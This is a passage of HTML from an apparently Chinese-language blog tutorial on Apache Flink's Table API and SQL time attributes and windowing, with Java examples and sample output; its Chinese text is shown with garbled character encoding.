class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. è½¬æ¢æˆPOJO</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;SensorReading&gt;(Time.seconds(<span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(SensorReading element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. å°†æµè½¬æ¢æˆè¡¨ï¼Œå®šä¹‰æ—¶é—´ç‰¹æ€§</span></span><br><span class="line">    <span class="comment">//        Table dataTable = tableEnv.fromDataStream(dataStream, &quot;id, timestamp as ts, temperature as temp, pt.proctime&quot;);</span></span><br><span class="line">    Table dataTable = tableEnv.fromDataStream(dataStream, <span class="string">&quot;id, timestamp as ts, temperature as temp, rt.rowtime&quot;</span>);</span><br><span class="line"></span><br><span class="line">    dataTable.printSchema();</span><br><span class="line"></span><br><span class="line">    tableEnv.toAppendStream(dataTable,Row.class).print();</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><p><em>æ³¨ï¼šè¿™é‡Œæœ€åä¸€åˆ—rté‡Œæ˜¾ç¤ºçš„æ˜¯EventTimeï¼Œè€Œä¸æ˜¯Processing Time</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line"> |-- id: STRING</span><br><span class="line"> |-- ts: BIGINT</span><br><span class="line"> |-- temp: DOUBLE</span><br><span class="line"> |-- rt: TIMESTAMP(3) *ROWTIME*</span><br><span class="line"></span><br><span class="line">sensor_1,1547718199,35.8,2019-01-17T09:43:19</span><br><span class="line">sensor_6,1547718201,15.4,2019-01-17T09:43:21</span><br><span class="line">sensor_7,1547718202,6.7,2019-01-17T09:43:22</span><br><span class="line">sensor_10,1547718205,38.1,2019-01-17T09:43:25</span><br><span class="line">sensor_1,1547718207,36.3,2019-01-17T09:43:27</span><br><span class="line">sensor_1,1547718209,32.8,2019-01-17T09:43:29</span><br><span class="line">sensor_1,1547718212,37.1,2019-01-17T09:43:32</span><br></pre></td></tr></table></figure><h4 id="çª—å£"><a href="#çª—å£" class="headerlink" title="çª—å£"></a>çª—å£</h4><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106482095">Flink-åˆ†ç»„çª—å£ | Over Windows | SQL ä¸­çš„ Group Windows | SQL ä¸­çš„ Over Windows</a></p></blockquote><ul><li>æ—¶é—´è¯­ä¹‰ï¼Œè¦é…åˆçª—å£æ“ä½œæ‰èƒ½å‘æŒ¥ä½œç”¨ã€‚</li><li>åœ¨Table APIå’ŒSQLä¸­ï¼Œä¸»è¦æœ‰ä¸¤ç§çª—å£ <ul><li>Group Windowsï¼ˆåˆ†ç»„çª—å£ï¼‰ <ul><li><strong>æ ¹æ®æ—¶é—´æˆ³æˆ–è¡Œè®¡æ•°é—´éš”ï¼Œå°†è¡Œèšåˆåˆ°æœ‰é™çš„ç»„ï¼ˆGroupï¼‰ä¸­ï¼Œå¹¶å¯¹æ¯ä¸ªç»„çš„æ•°æ®æ‰§è¡Œä¸€æ¬¡èšåˆå‡½æ•°</strong></li></ul></li><li>Over Windows <ul><li>é’ˆå¯¹æ¯ä¸ªè¾“å…¥è¡Œï¼Œè®¡ç®—ç›¸é‚»è¡ŒèŒƒå›´å†…çš„èšåˆ</li></ul></li></ul></li></ul><h5 id="Group-Windows"><a href="#Group-Windows" class="headerlink" title="Group Windows"></a>Group Windows</h5><ul><li><p> Group Windows æ˜¯ä½¿ç”¨ windowï¼ˆw:GroupWindowï¼‰å­å¥å®šä¹‰çš„ï¼Œå¹¶ä¸”<strong>å¿…é¡»ç”±aså­å¥æŒ‡å®šä¸€ä¸ªåˆ«å</strong>ã€‚ </p></li><li><p> ä¸ºäº†æŒ‰çª—å£å¯¹è¡¨è¿›è¡Œåˆ†ç»„ï¼Œçª—å£çš„åˆ«åå¿…é¡»åœ¨ group by å­å¥ä¸­ï¼Œåƒå¸¸è§„çš„åˆ†ç»„å­—æ®µä¸€æ ·å¼•ç”¨  </p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Table</span> table = input</span><br><span class="line">.window([w:<span class="type">GroupWindow</span>] as <span class="string">&quot;w&quot;</span>) <span class="comment">// å®šä¹‰çª—å£ï¼Œåˆ«åä¸ºw</span></span><br><span class="line">.groupBy(<span class="string">&quot;w, a&quot;</span>) <span class="comment">// æŒ‰ç…§å­—æ®µ aå’Œçª—å£ wåˆ†ç»„</span></span><br><span class="line">.select(<span class="string">&quot;a,b.sum&quot;</span>); <span class="comment">// èšåˆ</span></span><br></pre></td></tr></table></figure></li><li><p> Table API æä¾›äº†ä¸€ç»„å…·æœ‰ç‰¹å®šè¯­ä¹‰çš„é¢„å®šä¹‰ Window ç±»ï¼Œè¿™äº›ç±»ä¼šè¢«è½¬æ¢ä¸ºåº•å±‚ DataStream æˆ– DataSet çš„çª—å£æ“ä½œ </p></li><li><p>åˆ†ç»„çª—å£åˆ†ä¸ºä¸‰ç§ï¼š </p><ul><li>æ»šåŠ¨çª—å£</li><li>æ»‘åŠ¨çª—å£</li><li>ä¼šè¯çª—å£</li></ul></li></ul><h6 id="æ»šåŠ¨çª—å£-Tumbling-windows"><a href="#æ»šåŠ¨çª—å£-Tumbling-windows" class="headerlink" title="æ»šåŠ¨çª—å£(Tumbling windows)"></a>æ»šåŠ¨çª—å£(Tumbling windows)</h6><ul><li>æ»šåŠ¨çª—å£ï¼ˆTumbling windowsï¼‰è¦ç”¨Tumbleç±»æ¥å®šä¹‰</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Tumbling Event-time Windowï¼ˆäº‹ä»¶æ—¶é—´å­—æ®µrowtimeï¼‰</span></span><br><span class="line">.window(Tumble.over(<span class="string">&quot;10.minutes&quot;</span>).on(<span class="string">&quot;rowtime&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Tumbling Processing-time Windowï¼ˆå¤„ç†æ—¶é—´å­—æ®µproctimeï¼‰</span></span><br><span class="line">.window(Tumble.over(<span class="string">&quot;10.minutes&quot;</span>).on(<span class="string">&quot;proctime&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Tumbling Row-count Window (ç±»ä¼¼äºè®¡æ•°çª—å£ï¼ŒæŒ‰å¤„ç†æ—¶é—´æ’åºï¼Œ10è¡Œä¸€ç»„)</span></span><br><span class="line">.window(Tumble.over(<span class="string">&quot;10.rows&quot;</span>).on(<span class="string">&quot;proctime&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br></pre></td></tr></table></figure><ul><li>overï¼šå®šä¹‰çª—å£é•¿åº¦</li><li>onï¼šç”¨æ¥åˆ†ç»„ï¼ˆæŒ‰æ—¶é—´é—´éš”ï¼‰æˆ–è€…æ’åºï¼ˆæŒ‰è¡Œæ•°ï¼‰çš„æ—¶é—´å­—æ®µ</li><li>asï¼šåˆ«åï¼Œå¿…é¡»å‡ºç°åœ¨åé¢çš„groupByä¸­</li></ul><h6 id="æ»‘åŠ¨çª—å£-Sliding-windows"><a href="#æ»‘åŠ¨çª—å£-Sliding-windows" class="headerlink" title="æ»‘åŠ¨çª—å£(Sliding windows)"></a>æ»‘åŠ¨çª—å£(Sliding windows)</h6><ul><li>æ»‘åŠ¨çª—å£ï¼ˆSliding windowsï¼‰è¦ç”¨Slideç±»æ¥å®šä¹‰</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Sliding Event-time Window</span></span><br><span class="line">.window(Slide.over(<span class="string">&quot;10.minutes&quot;</span>).every(<span class="string">&quot;5.minutes&quot;</span>).on(<span class="string">&quot;rowtime&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sliding Processing-time window </span></span><br><span class="line">.window(Slide.over(<span class="string">&quot;10.minutes&quot;</span>).every(<span class="string">&quot;5.minutes&quot;</span>).on(<span class="string">&quot;proctime&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sliding Row-count window</span></span><br><span class="line">.window(Slide.over(<span class="string">&quot;10.rows&quot;</span>).every(<span class="string">&quot;5.rows&quot;</span>).on(<span class="string">&quot;proctime&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br></pre></td></tr></table></figure><ul><li>overï¼šå®šä¹‰çª—å£é•¿åº¦</li><li>everyï¼šå®šä¹‰æ»‘åŠ¨æ­¥é•¿</li><li>onï¼šç”¨æ¥åˆ†ç»„ï¼ˆæŒ‰æ—¶é—´é—´éš”ï¼‰æˆ–è€…æ’åºï¼ˆæŒ‰è¡Œæ•°ï¼‰çš„æ—¶é—´å­—æ®µ</li><li>asï¼šåˆ«åï¼Œå¿…é¡»å‡ºç°åœ¨åé¢çš„groupByä¸­</li></ul><h6 id="ä¼šè¯çª—å£-Session-windows"><a href="#ä¼šè¯çª—å£-Session-windows" class="headerlink" title="ä¼šè¯çª—å£(Session windows)"></a>ä¼šè¯çª—å£(Session windows)</h6><ul><li>ä¼šè¯çª—å£ï¼ˆSession windowsï¼‰è¦ç”¨Sessionç±»æ¥å®šä¹‰</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Session Event-time Window</span></span><br><span class="line">.window(Session.withGap(<span class="string">&quot;10.minutes&quot;</span>).on(<span class="string">&quot;rowtime&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Session Processing-time Window </span></span><br><span class="line">.window(Session.withGap(<span class="string">&quot;10.minutes&quot;</span>).on(<span class="string">&quot;proctime&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br></pre></td></tr></table></figure><ul><li>withGapï¼šä¼šè¯æ—¶é—´é—´éš”</li><li>onï¼šç”¨æ¥åˆ†ç»„ï¼ˆæŒ‰æ—¶é—´é—´éš”ï¼‰æˆ–è€…æ’åºï¼ˆæŒ‰è¡Œæ•°ï¼‰çš„æ—¶é—´å­—æ®µ</li><li>asï¼šåˆ«åï¼Œå¿…é¡»å‡ºç°åœ¨åé¢çš„groupByä¸­</li></ul><h5 id="SQLä¸­çš„Group-Windows"><a href="#SQLä¸­çš„Group-Windows" class="headerlink" title="SQLä¸­çš„Group Windows"></a>SQLä¸­çš„Group Windows</h5><p>Group Windowså®šä¹‰åœ¨SQLæŸ¥è¯¢çš„Group Byå­å¥ä¸­</p><ul><li>TUMBLE(time_attr, interval) <ul><li>å®šä¹‰ä¸€ä¸ªæ»šåŠ¨çª—å£ï¼Œæ¯ä¸€ä¸ªå‚æ•°æ˜¯æ—¶é—´å­—æ®µï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯çª—å£é•¿åº¦</li></ul></li><li>HOP(time_attrï¼Œintervalï¼Œinterval) <ul><li>å®šä¹‰ä¸€ä¸ªæ»‘åŠ¨çª—å£ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ—¶é—´å­—æ®µï¼Œ<strong>ç¬¬äºŒä¸ªå‚æ•°æ˜¯çª—å£æ»‘åŠ¨æ­¥é•¿ï¼Œç¬¬ä¸‰ä¸ªæ˜¯çª—å£é•¿åº¦</strong></li></ul></li><li>SESSION(time_attrï¼Œinterval) <ul><li>å®šä¹‰ä¸€ä¸ªç»˜ç”»çª—å£ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ—¶é—´å­—æ®µï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯çª—å£é—´éš”</li></ul></li></ul><h6 id="æµ‹è¯•ä»£ç -9"><a href="#æµ‹è¯•ä»£ç -9" class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.TimeCharacteristic;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Over;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Tumble;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 12:47 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest5_TimeAndWindow</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»ºç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. è¯»å…¥æ–‡ä»¶æ•°æ®ï¼Œå¾—åˆ°DataStream</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. è½¬æ¢æˆPOJO</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;SensorReading&gt;(Time.seconds(<span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(SensorReading element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. å°†æµè½¬æ¢æˆè¡¨ï¼Œå®šä¹‰æ—¶é—´ç‰¹æ€§</span></span><br><span class="line">    <span class="comment">//        Table dataTable = tableEnv.fromDataStream(dataStream, &quot;id, timestamp as ts, temperature as temp, pt.proctime&quot;);</span></span><br><span class="line">    Table dataTable = tableEnv.fromDataStream(dataStream, <span class="string">&quot;id, timestamp as ts, temperature as temp, rt.rowtime&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//        dataTable.printSchema();</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//        tableEnv.toAppendStream(dataTable,Row.class).print();</span></span><br><span class="line"></span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;sensor&quot;</span>, dataTable);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. çª—å£æ“ä½œ</span></span><br><span class="line">    <span class="comment">// 5.1 Group Window</span></span><br><span class="line">    <span class="comment">// table API</span></span><br><span class="line">    Table resultTable = dataTable.window(Tumble.over(<span class="string">&quot;10.seconds&quot;</span>).on(<span class="string">&quot;rt&quot;</span>).as(<span class="string">&quot;tw&quot;</span>))</span><br><span class="line">      .groupBy(<span class="string">&quot;id, tw&quot;</span>)</span><br><span class="line">      .select(<span class="string">&quot;id, id.count, temp.avg, tw.end&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SQL</span></span><br><span class="line">    Table resultSqlTable = tableEnv.sqlQuery(<span class="string">&quot;select id, count(id) as cnt, avg(temp) as avgTemp, tumble_end(rt, interval &#x27;10&#x27; second) &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;from sensor group by id, tumble(rt, interval &#x27;10&#x27; second)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    dataTable.printSchema();</span><br><span class="line">    tableEnv.toAppendStream(resultTable, Row.class).print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">    tableEnv.toRetractStream(resultSqlTable, Row.class).print(<span class="string">&quot;sql&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line"> |-- id: STRING</span><br><span class="line"> |-- ts: BIGINT</span><br><span class="line"> |-- temp: DOUBLE</span><br><span class="line"> |-- rt: TIMESTAMP(<span class="number">3</span>) *ROWTIME*</span><br><span class="line"></span><br><span class="line">result&gt; sensor_1,<span class="number">1</span>,<span class="number">35.8</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">20</span></span><br><span class="line">result&gt; sensor_6,<span class="number">1</span>,<span class="number">15.4</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">30</span></span><br><span class="line">result&gt; sensor_1,<span class="number">2</span>,<span class="number">34.55</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">30</span></span><br><span class="line">result&gt; sensor_10,<span class="number">1</span>,<span class="number">38.1</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">30</span></span><br><span class="line">result&gt; sensor_7,<span class="number">1</span>,<span class="number">6.7</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">30</span></span><br><span class="line">sql&gt; (<span class="keyword">true</span>,sensor_1,<span class="number">1</span>,<span class="number">35.8</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">20</span>)</span><br><span class="line">result&gt; sensor_1,<span class="number">1</span>,<span class="number">37.1</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">40</span></span><br><span class="line">sql&gt; (<span class="keyword">true</span>,sensor_6,<span class="number">1</span>,<span class="number">15.4</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">30</span>)</span><br><span class="line">sql&gt; (<span class="keyword">true</span>,sensor_1,<span class="number">2</span>,<span class="number">34.55</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">30</span>)</span><br><span class="line">sql&gt; (<span class="keyword">true</span>,sensor_10,<span class="number">1</span>,<span class="number">38.1</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">30</span>)</span><br><span class="line">sql&gt; (<span class="keyword">true</span>,sensor_7,<span class="number">1</span>,<span class="number">6.7</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">30</span>)</span><br><span class="line">sql&gt; (<span class="keyword">true</span>,sensor_1,<span class="number">1</span>,<span class="number">37.1</span>,<span class="number">2019</span>-<span class="number">01</span>-17T09:<span class="number">43</span>:<span class="number">40</span>)</span><br></pre></td></tr></table></figure><h5 id="Over-Windows"><a href="#Over-Windows" class="headerlink" title="Over Windows"></a>Over Windows</h5><blockquote><p><a href="https://blog.csdn.net/liuyuehui110/article/details/42736667">SQLä¸­overçš„ç”¨æ³•</a></p><p><a href="https://www.cnblogs.com/xiayang/articles/1886372.html">sql overçš„ä½œç”¨åŠç”¨æ³•</a></p></blockquote><ul><li><p> <strong>Over window èšåˆæ˜¯æ ‡å‡† SQL ä¸­å·²æœ‰çš„ï¼ˆover å­å¥ï¼‰ï¼Œå¯ä»¥åœ¨æŸ¥è¯¢çš„ SELECT å­å¥ä¸­å®šä¹‰</strong> </p></li><li><p> Over window èšåˆï¼Œä¼š<strong>é’ˆå¯¹æ¯ä¸ªè¾“å…¥è¡Œ</strong>ï¼Œè®¡ç®—ç›¸é‚»è¡ŒèŒƒå›´å†…çš„èšåˆ </p></li><li><p> Over windows ä½¿ç”¨ windowï¼ˆw:overwindows*ï¼‰å­å¥å®šä¹‰ï¼Œå¹¶åœ¨ selectï¼ˆï¼‰æ–¹æ³•ä¸­é€šè¿‡<strong>åˆ«å</strong>æ¥å¼•ç”¨  </p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Table</span> table = input</span><br><span class="line">.window([w: <span class="type">OverWindow</span>] as <span class="string">&quot;w&quot;</span>)</span><br><span class="line">.select(<span class="string">&quot;a, b.sum over w, c.min over w&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p> Table API æä¾›äº† Over ç±»ï¼Œæ¥é…ç½® Over çª—å£çš„å±æ€§ </p></li></ul><h6 id="æ— ç•ŒOver-Windows"><a href="#æ— ç•ŒOver-Windows" class="headerlink" title="æ— ç•ŒOver Windows"></a>æ— ç•ŒOver Windows</h6><ul><li>å¯ä»¥åœ¨äº‹ä»¶æ—¶é—´æˆ–å¤„ç†æ—¶é—´ï¼Œä»¥åŠæŒ‡å®šä¸ºæ—¶é—´é—´éš”ã€æˆ–è¡Œè®¡æ•°çš„èŒƒå›´å†…ï¼Œå®šä¹‰ Over windows</li><li>æ— ç•Œçš„ over window æ˜¯ä½¿ç”¨å¸¸é‡æŒ‡å®šçš„</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ— ç•Œçš„äº‹ä»¶æ—¶é—´over window (æ—¶é—´å­—æ®µ &quot;rowtime&quot;)</span></span><br><span class="line">.window(Over.partitionBy(<span class="string">&quot;a&quot;</span>).orderBy(<span class="string">&quot;rowtime&quot;</span>).preceding(UNBOUNDED_RANGE).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ— ç•Œçš„å¤„ç†æ—¶é—´over window (æ—¶é—´å­—æ®µ&quot;proctime&quot;)</span></span><br><span class="line">.window(Over.partitionBy(<span class="string">&quot;a&quot;</span>).orderBy(<span class="string">&quot;proctime&quot;</span>).preceding(UNBOUNDED_RANGE).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ— ç•Œçš„äº‹ä»¶æ—¶é—´Row-count over window (æ—¶é—´å­—æ®µ &quot;rowtime&quot;)</span></span><br><span class="line">.window(Over.partitionBy(<span class="string">&quot;a&quot;</span>).orderBy(<span class="string">&quot;rowtime&quot;</span>).preceding(UNBOUNDED_ROW).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ— ç•Œçš„å¤„ç†æ—¶é—´Row-count over window (æ—¶é—´å­—æ®µ &quot;rowtime&quot;)</span></span><br><span class="line">.window(Over.partitionBy(<span class="string">&quot;a&quot;</span>).orderBy(<span class="string">&quot;proctime&quot;</span>).preceding(UNBOUNDED_ROW).as(<span class="string">&quot;w&quot;</span>))</span><br></pre></td></tr></table></figure><p><em>partitionByæ˜¯å¯é€‰é¡¹</em></p><h6 id="æœ‰ç•ŒOver-Windows"><a href="#æœ‰ç•ŒOver-Windows" class="headerlink" title="æœ‰ç•ŒOver Windows"></a>æœ‰ç•ŒOver Windows</h6><ul><li>æœ‰ç•Œçš„over windowæ˜¯ç”¨é—´éš”çš„å¤§å°æŒ‡å®šçš„</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æœ‰ç•Œçš„äº‹ä»¶æ—¶é—´over window (æ—¶é—´å­—æ®µ &quot;rowtime&quot;ï¼Œä¹‹å‰1åˆ†é’Ÿ)</span></span><br><span class="line">.window(Over.partitionBy(<span class="string">&quot;a&quot;</span>).orderBy(<span class="string">&quot;rowtime&quot;</span>).preceding(<span class="string">&quot;1.minutes&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ‰ç•Œçš„å¤„ç†æ—¶é—´over window (æ—¶é—´å­—æ®µ &quot;rowtime&quot;ï¼Œä¹‹å‰1åˆ†é’Ÿ)</span></span><br><span class="line">.window(Over.partitionBy(<span 